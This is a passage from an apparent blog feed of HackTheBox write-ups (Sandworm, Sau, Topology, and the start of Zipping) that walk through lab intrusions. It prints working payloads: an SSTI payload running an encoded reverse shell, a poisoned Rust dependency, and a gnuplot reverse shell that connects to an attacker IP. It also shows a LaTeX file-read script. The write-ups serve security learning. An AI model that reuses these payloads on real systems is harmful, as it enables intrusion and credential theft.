# Nmap done at Mon Aug 21 22:19:00 2023 -- 1 IP address (1 host up) scanned in 88.24 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230903201307.png" alt="" />
<img src="/assets/img/Pasted image 20230903201323.png" alt="" /></p>

<p>Contact page linked to a page to submit PGP-encrypted tips;</p>

<p><img src="/assets/img/Pasted image 20230903201539.png" alt="" /></p>

<p>The linked <code class="language-plaintext highlighter-rouge">guide</code> page allows us to test PGP encryption, decryption, and signature verification using our own keys and messages. I generated a key and started testing.</p>

<p>For the  signature verification feature, I created a simple message in <code class="language-plaintext highlighter-rouge">tmp.txt</code> and signed it with armor (printable ascii output);</p>

<p><img src="/assets/img/Pasted image 20230903202816.png" alt="" /></p>

<p>Uploading the public key and the signed message, I got this;</p>

<p><img src="/assets/img/Pasted image 20230903203045.png" alt="" />
<img src="/assets/img/Pasted image 20230903203647.png" alt="" /></p>

<p>The email address and userâ€™s full name added to the key are displayed. Testing for SSTI by generating a key with the payload <code class="language-plaintext highlighter-rouge">testuser{{2*2}}</code>;</p>

<p><img src="/assets/img/Pasted image 20230903204114.png" alt="" /></p>

<p>We have SSTI!</p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Listing accessible objects in scope using the payload <code class="language-plaintext highlighter-rouge">{{"".__class__.__mro__[1].__subclasses__()}}</code> showed the <code class="language-plaintext highlighter-rouge">subprocess.Popen()</code> is at index <code class="language-plaintext highlighter-rouge">439</code>. Knowing this, I was able to gain a shell on the box using the payload;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">testuser</span><span class="p">{{</span><span class="s">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">439</span><span class="p">](</span><span class="s">"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43My80NDQ0IDA+JjEK|base64 -d|/bin/bash"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)}}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230903204803.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">atlas</code> isnâ€™t in any special groups, and no sudo perms. It looks like we are in a jailed environment as most tools like <code class="language-plaintext highlighter-rouge">curl</code> and <code class="language-plaintext highlighter-rouge">wget</code> are not available. The box does have python 3 installed, so I was able to use that to do stuff. Going through the home directory of <code class="language-plaintext highlighter-rouge">atlas</code>, I found some creds in <code class="language-plaintext highlighter-rouge">~/.config/httpie/sessions/localhost_5000/admin.json</code>;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"__meta__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"about"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HTTPie session file"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"help"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://httpie.io/docs#sessions"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"httpie"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.6.0"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"auth"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"quietLiketheWind22"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
        </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"silentobserver"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"cookies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"session"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"expires"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"secure"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"headers"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"Accept"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/json, */*;q=0.5"</span><span class="w">
    </span><span class="p">}</span><span class="w">

</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>There is a user named <code class="language-plaintext highlighter-rouge">silentobserver</code> in the box. Using the password, I was able to login over SSH;</p>

<p><img src="/assets/img/Pasted image 20230903205547.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>User not in any special group, nor has any sudo perms. Running <code class="language-plaintext highlighter-rouge">pspy</code> picked up something interesting;</p>

<p><img src="/assets/img/Pasted image 20230903210203.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">/opt/tipnet</code> contains the source code of some <em>Go</em> application. The <code class="language-plaintext highlighter-rouge">Cargo.toml</code> file showed itâ€™s using <code class="language-plaintext highlighter-rouge">/opt/crates/logger</code> as a local dependency;</p>

<p><img src="/assets/img/Pasted image 20230903210546.png" alt="" /></p>

<p>We have write permission on the source file of this dependency;</p>

<p><img src="/assets/img/Pasted image 20230903210748.png" alt="" /></p>

<p>So I overwrote the <code class="language-plaintext highlighter-rouge">lib.rs</code> file with the following code;</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">use</span> <span class="n">std</span><span class="o">::</span><span class="n">process</span><span class="o">::</span><span class="n">Command</span><span class="p">;</span>

<span class="n">pub</span> <span class="n">fn</span> <span class="n">log</span><span class="p">(</span><span class="n">user</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">str</span><span class="p">,</span> <span class="n">query</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">str</span><span class="p">,</span> <span class="n">justification</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Command</span><span class="o">::</span><span class="nb">new</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">arg</span><span class="p">(</span><span class="s">"-c"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">arg</span><span class="p">(</span><span class="s">"bash -i &gt;&amp; /dev/tcp/10.10.16.73/4444 0&gt;&amp;1"</span><span class="p">)</span>
        <span class="o">.</span><span class="n">spawn</span><span class="p">()</span>
        <span class="o">.</span><span class="n">expect</span><span class="p">(</span><span class="s">"error"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>After a while, I got a shell on the box as <code class="language-plaintext highlighter-rouge">atlas</code> again, but this time in an unjailed environment (outside <em>Firejail</em>);</p>

<p><img src="/assets/img/Pasted image 20230903211403.png" alt="" /></p>

<p>Searching for SUID files showed <code class="language-plaintext highlighter-rouge">/usr/local/bin/firejail</code> has it;</p>

<p><img src="/assets/img/Pasted image 20230903211616.png" alt="" />
<img src="/assets/img/Pasted image 20230903211628.png" alt="" /></p>

<p>Notice we can execute the binary since we are in the <code class="language-plaintext highlighter-rouge">jailer</code> group. Using this <a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">exploit</a>, I got root after upgrading to SSH because the exploit requires the use of multiple shells (running it in the background with <code class="language-plaintext highlighter-rouge">&amp;</code>, the process kept dying);</p>

<p><img src="/assets/img/Pasted image 20230903213013.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found <strong>22</strong>, <strong>80</strong>, and <strong>443</strong></li>
  <li>Exploited SSTI on the web app through <code class="language-plaintext highlighter-rouge">pgp</code> key to gain shell as <code class="language-plaintext highlighter-rouge">atlas</code>.</li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">atlas</code> in a jailed env (Firejail);
    <ul>
      <li>Recovered some creds in <code class="language-plaintext highlighter-rouge">atlas</code> home dir to gain access to <code class="language-plaintext highlighter-rouge">silentobserver</code></li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">silentobserver</code>;
    <ul>
      <li>Exploited write perms on a dependency for a Go project to gain a shell as <code class="language-plaintext highlighter-rouge">atlas</code>, but this time outside <em>Firejail</em></li>
      <li>Exploited the SUID perm on <code class="language-plaintext highlighter-rouge">firejail</code> to gain a shell as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="medium" /><category term="linux" /><category term="web" /><category term="php" /><category term="ssti" /><category term="python" /><category term="go" /><category term="crates" /><category term="firejail" /><summary type="html"><![CDATA[Sandworm is a nice medium linux box on HackTheBox. It starts with exploiting an SSTI vulnerability in a custom web app that does some PGP operations using user input. Once inside, youâ€™ll need to break out of firejail by injecting payload into a Go project thatâ€™s been used in a cron job. Privesc is through SUID exploit on firejail.]]></summary></entry><entry><title type="html">Sau - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/sau.html" rel="alternate" type="text/html" title="Sau - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/sau</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/sau.html"><![CDATA[<p><strong>Sau</strong> is probably the shortest box ever released on <em>HackTheBox</em>. Foothold involves exploiting <em>Request Baskets</em> to access a hidden instance of <em>Maltrail</em>, which is vulnerable to RCE. Privesc is through the linux CLI pager invoked by <code class="language-plaintext highlighter-rouge">systemctl</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230901191235.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230901191255.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Wed Aug 16 17:59:21 2023 as: nmap -sS -p- -v -oN nmap-all.txt -min-rate 500 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.32s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Aug 16 18:03:02 2023 -- 1 IP address (1 host up) scanned in 221.42 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h3 id="web">Web</h3>
<p><br /></p>

<p>Port <strong>80</strong> is filtered, which is odd. Port <strong>55555</strong> seems to be running <em>Request Baskets</em>, which is vulnerable to SSRF;</p>

<p><img src="/assets/img/Pasted image 20230901192203.png" alt="" />
<img src="/assets/img/Pasted image 20230901192251.png" alt="" /></p>

<p>Using the exploit, I was able to access port <strong>80</strong> using the SSRF;</p>

<p><img src="/assets/img/Pasted image 20230901192431.png" alt="" /></p>

<p>This gave me a broken page, but it was enough to identify the service, which also has a CVE;</p>

<p><img src="/assets/img/Pasted image 20230901192618.png" alt="" />
<img src="/assets/img/Pasted image 20230901192705.png" alt="" /></p>

<p>Using the exploit, I got a shell on the box as <code class="language-plaintext highlighter-rouge">puma</code>;</p>

<p><img src="/assets/img/Pasted image 20230901193014.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">puma</code> is not in any special group. <code class="language-plaintext highlighter-rouge">sudo -l</code> showed the user has a sudo perm configured;</p>

<p><img src="/assets/img/Pasted image 20230901193157.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">systemctl</code> uses a terminal pager when viewing the status of a service, which will allow for a very easy privesc since typing <code class="language-plaintext highlighter-rouge">!</code> followed by a command allows users to run shell commands from such pagers, which I used to invoke <code class="language-plaintext highlighter-rouge">bash</code>;</p>

<p><img src="/assets/img/Pasted image 20230901193409.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP showed port <strong>80</strong> (filtered) and <strong>55555</strong> (Request Baskets)</li>
  <li>Exploited SSRF in <em>Request Baskets</em> to access port <strong>80</strong> (Maltrail), which is vulnerable to RCE.</li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">puma</code>;
    <ul>
      <li>Exploited <code class="language-plaintext highlighter-rouge">sudo</code> perm on <code class="language-plaintext highlighter-rouge">systemctl status trail.service</code> to run shell commands as <code class="language-plaintext highlighter-rouge">root</code> via the terminal pager.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="web" /><category term="request baskets" /><category term="maltrail" /><category term="pager" /><summary type="html"><![CDATA[Sau is probably the shortest box ever released on HackTheBox. Foothold involves exploiting Request Baskets to access a hidden instance of Maltrail, which is vulnerable to RCE. Privesc is through the linux CLI pager invoked by systemctl.]]></summary></entry><entry><title type="html">Topology - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/topology.html" rel="alternate" type="text/html" title="Topology - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/topology</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/topology.html"><![CDATA[<p><strong>Topology</strong> is an easy linux machine on <em>HackTheBox</em>. It starts with exploiting a custom LaTeX parser to get LFI and leak creds to get a foothold on the box. Root involves exploiting <em>gnuplot</em>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230830182840.png" alt="" />
<img src="/assets/img/Pasted image 20230830182930.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<p>(Scan missed port 22 for some reason, but itâ€™s open)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Wed Aug 16 23:23:05 2023 as: nmap -sC -sV -oN nmap.txt -v -T5 -Pn 10.10.11.217
Warning: 10.10.11.217 giving up on port because retransmission cap hit (2).
Increasing send delay for 10.10.11.217 from 0 to 5 due to 11 out of 23 dropped probes since last increase.
Nmap scan report for 10.10.11.217
Host is up (0.24s latency).
Not shown: 748 filtered ports, 251 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 16 23:25:23 2023 -- 1 IP address (1 host up) scanned in 138.92 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230830183232.png" alt="" /></p>

<p>The homepage links to a subdomain;</p>

<p><img src="/assets/img/Pasted image 20230830183441.png" alt="" /></p>

<p>I added it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and load it up;</p>

<p><img src="/assets/img/Pasted image 20230830184317.png" alt="" /></p>

<p>The page accepts our input in <em>LaTeX</em> and generate a PNG file out of it;</p>

<p><img src="/assets/img/Pasted image 20230830184526.png" alt="" />
<img src="/assets/img/Pasted image 20230830184549.png" alt="" /></p>

<p><em>LaTeX</em> is a powerful and obscure language, so I started looking for <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">cheatsheets</a> and reading docs. The simple latex code <code class="language-plaintext highlighter-rouge">\input{/etc/hostname}</code> can be used to read a file, but the application seems to block it;</p>

<p><img src="/assets/img/Pasted image 20230830184817.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Many other useful commands were blocked. I was able to read files one line at a time using the payload;</p>

<div class="language-latex highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">\newread\file</span> <span class="k">\openin\file</span>=/etc/passwd <span class="k">\read\file</span> to<span class="k">\line</span> <span class="k">\text</span><span class="p">{</span><span class="k">\line</span><span class="p">}</span> <span class="k">\closein\file</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230830185105.png" alt="" /></p>

<p>I tried adding a loop to this payload, but that was blocked too by the application. So I wrote a script that will sequentially expand the payload to read files one line at a time, and parse the response using OCR provided by the library <code class="language-plaintext highlighter-rouge">pytesseract</code>;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="c1">#!/bin/python3
#--------------------------------------------------------------------
# A script to dump files one line at a time for Topology - HackTheBox
#                                                     Author: 4g3nt47
#--------------------------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="nn">pytesseract</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">requests</span>

<span class="n">fname</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">tmp</span> <span class="o">=</span> <span class="s">"output.png"</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">newread</span><span class="se">\\</span><span class="s">file </span><span class="se">\\</span><span class="s">openin</span><span class="se">\\</span><span class="s">file="</span> <span class="o">+</span> <span class="n">fname</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">read</span><span class="se">\\</span><span class="s">file to</span><span class="se">\\</span><span class="s">line "</span> <span class="o">*</span> <span class="n">count</span><span class="p">)</span> <span class="o">+</span>  <span class="s">"</span><span class="se">\\</span><span class="s">text{</span><span class="se">\\</span><span class="s">line} </span><span class="se">\\</span><span class="s">closein</span><span class="se">\\</span><span class="s">file"</span>
  <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://latex.topology.htb/equation.php"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"eqn"</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
  <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Length'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">break</span>
  <span class="k">if</span> <span class="n">req</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Type'</span><span class="p">]</span> <span class="o">!=</span> <span class="s">"image/png"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Error obtaining line </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="k">break</span>
  <span class="n">wfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
  <span class="n">wfo</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
  <span class="n">wfo</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="n">pytesseract</span><span class="p">.</span><span class="n">image_to_string</span><span class="p">(</span><span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">tmp</span><span class="p">)).</span><span class="n">rstrip</span><span class="p">())</span>
  <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This seems to work at first, but the problem with this approach is that with every line read, the size of our payload increases by several bytes. After a few lines, we exceeded the input limit of the web app;</p>

<p><img src="/assets/img/Pasted image 20230830185627.png" alt="" /></p>

<p>Going back to <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection"><em>PayloadAllTheThings</em></a>, I noticed something at the beginning of the page;</p>

<p><img src="/assets/img/Pasted image 20230830185827.png" alt="" /></p>

<p>Trying the <code class="language-plaintext highlighter-rouge">$</code> character as a wrapper for one of the payloads, I was able to read a file successfully;</p>

<div class="language-latex highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">$</span><span class="nv">\lstinputlisting</span><span class="p">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">passwd</span><span class="p">}$</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230830190029.png" alt="" /></p>

<p>From the HTTP headers we know the server is running <em>Apache2</em>, so I dumped itâ€™s default config file;</p>

<div class="language-latex highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">$</span><span class="nv">\lstinputlisting</span><span class="p">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">apache</span><span class="m">2</span><span class="o">/</span><span class="nb">sites</span><span class="o">-</span><span class="nb">enabled</span><span class="o">/</span><span class="m">000</span><span class="o">-</span><span class="nb">default.conf</span><span class="p">}$</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230830190448.png" alt="" /></p>

<p>This revealed a new subdomain, so I added it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. Loading the page, I was prompted for a login;</p>

<p><img src="/assets/img/Pasted image 20230830190630.png" alt="" /></p>

<p>The request generated showed itâ€™s a basic HTTP authentication;</p>

<p><img src="/assets/img/Pasted image 20230830193849.png" alt="" /></p>

<p>This is usually configured in <em>Apache2</em> using <code class="language-plaintext highlighter-rouge">.htaccess</code> files. Since the config told us the web root for this domain is at <code class="language-plaintext highlighter-rouge">/var/www/dev</code>, I used the <em>LaTeX</em> LFI to check for <code class="language-plaintext highlighter-rouge">/var/www/dev/.htaccess</code>;</p>

<p><img src="/assets/img/Pasted image 20230830190949.png" alt="" /></p>

<p>Dumping the contents of <code class="language-plaintext highlighter-rouge">/var/www/dev/.htpasswd</code> gave me a hash;</p>

<p><img src="/assets/img/Pasted image 20230830191035.png" alt="" /></p>

<p>Feeding this to <code class="language-plaintext highlighter-rouge">john</code>, I was able to crack it;</p>

<p><img src="/assets/img/Pasted image 20230830191403.png" alt="" /></p>

<p>We know from <code class="language-plaintext highlighter-rouge">/etc/passwd</code> that <code class="language-plaintext highlighter-rouge">vdaisley</code> is a valid user, so I tried the password over SSH, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230830191557.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br />
<code class="language-plaintext highlighter-rouge">vdaisley</code> does not have sudo perms, nor in any interesting group. Running <code class="language-plaintext highlighter-rouge">pspy</code> on the box picked up something interesting;</p>

<p><img src="/assets/img/Pasted image 20230830192156.png" alt="" /></p>

<p>It looks like there is a cron job running as <code class="language-plaintext highlighter-rouge">root</code>, and passing all files inside <code class="language-plaintext highlighter-rouge">/opt/gnuplot</code> to <code class="language-plaintext highlighter-rouge">gnuplot</code> command. According to <code class="language-plaintext highlighter-rouge">apt info gnuplot</code>, it is a;</p>
<blockquote>
  <p>Command-line driven interactive plotting program. Gnuplot is a portable command-line driven interactive data and function plotting utility that supports lots of output formats, including drivers for many printers, (La)TeX, (x)fig, Postscript, and so on. The X11-output is packaged in gnuplot-x11.</p>
</blockquote>

<p>The <code class="language-plaintext highlighter-rouge">/opt/gnuplot</code> directory is globally writable, which means we can drop <code class="language-plaintext highlighter-rouge">.plt</code> files in there to be processed by <code class="language-plaintext highlighter-rouge">gnuplot</code>;</p>

<p><img src="/assets/img/Pasted image 20230830192513.png" alt="" /></p>

<p><strong>gnuplot</strong> can be instructed to run a <a href="https://stackoverflow.com/questions/53519962/how-to-run-a-shell-command-in-gnuplot-and-place-the-output-in-new-file">shell command</a> using the <code class="language-plaintext highlighter-rouge">system()</code> function. So I created a simple <code class="language-plaintext highlighter-rouge">.plt</code> file to spawn a rev shell;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.73/4444 0&gt;&amp;1'"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Downloading it into the <code class="language-plaintext highlighter-rouge">/opt/gnuplot</code> directory, I got a callback after a few seconds;</p>

<p><img src="/assets/img/Pasted image 20230830192941.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>80</strong></li>
  <li>Found a web app for testing <em>LaTeX</em> code;
    <ul>
      <li>Exploited it to gain LFI and leak a hash from <code class="language-plaintext highlighter-rouge">.htpasswd</code> file</li>
      <li>Cracked it and gained access over SSH as <code class="language-plaintext highlighter-rouge">vdaisley</code></li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">vdaisley</code>;
    <ul>
      <li>Identified a running cron job that process <code class="language-plaintext highlighter-rouge">.plt</code> files inside a globally writable directory.</li>
      <li>Exploited it to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="web" /><category term="latex" /><category term="gnuplot" /><category term="pytesseract" /><category term="htaccess" /><category term="htpasswd" /><summary type="html"><![CDATA[Topology is an easy linux machine on HackTheBox. It starts with exploiting a custom LaTeX parser to get LFI and leak creds to get a foothold on the box. Root involves exploiting gnuplot.]]></summary></entry><entry><title type="html">Zipping - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/zipping.html" rel="alternate" type="text/html" title="Zipping - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/zipping</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/zipping.html"><![CDATA[<p><strong>Zipping</strong> is a nice medium linux box on <em>HackTheBox</em>. It starts with exploiting a descrepancy on how <code class="language-plaintext highlighter-rouge">gz</code> (CLI) and <code class="language-plaintext highlighter-rouge">ZipArchive</code> (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking itâ€™s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with <code class="language-plaintext highlighter-rouge">dlopen()</code>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230830162817.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

